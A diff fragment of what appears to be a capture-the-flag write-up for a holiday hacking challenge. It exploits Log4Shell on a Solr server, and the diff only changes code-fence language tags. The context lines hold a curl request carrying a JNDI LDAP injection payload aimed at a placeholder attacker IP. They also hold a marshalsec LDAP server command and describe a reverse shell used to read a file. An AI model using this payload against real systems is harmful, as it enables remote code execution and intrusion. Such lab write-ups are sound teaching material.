@@ -29,13 +29,13 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http:/
 This application acts as an LDAP server and uses the Java class on the web server as remote code base.
 
 Finally the Log4J vulnerability is triggered:
-```
+```bash
 curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?foo=$\{jndi:ldap://MARSHALSECIP:1389/YuleLogExploit\}'
 ```
 *MARSHALSECIP* has to be replaced with the terminal's IP address.
 
 This triggers on the solr server an LDAP connection to the marshalsec service, which in turn delivers the Java class hosted on the web server. The solr server then executes this class, effectively creating a reverse shell connection to the netcat listener. This allows the file `kringle.txt` to be retrieved.
-```
+```bash
 cat /home/solr/kringle.txt
 
 The solution to Log4shell is patching.
@@ -67,7 +67,7 @@ public class Joergen {
 *CLIENTIP* has to be replaced with the terminal's IP address.
 
 ### Alternative 2: pure Java solution, hence platform independant
-```java
+```java linenums="1"
 import java.io.*;
 import java.nio.file.*;
 import java.net.Socket;
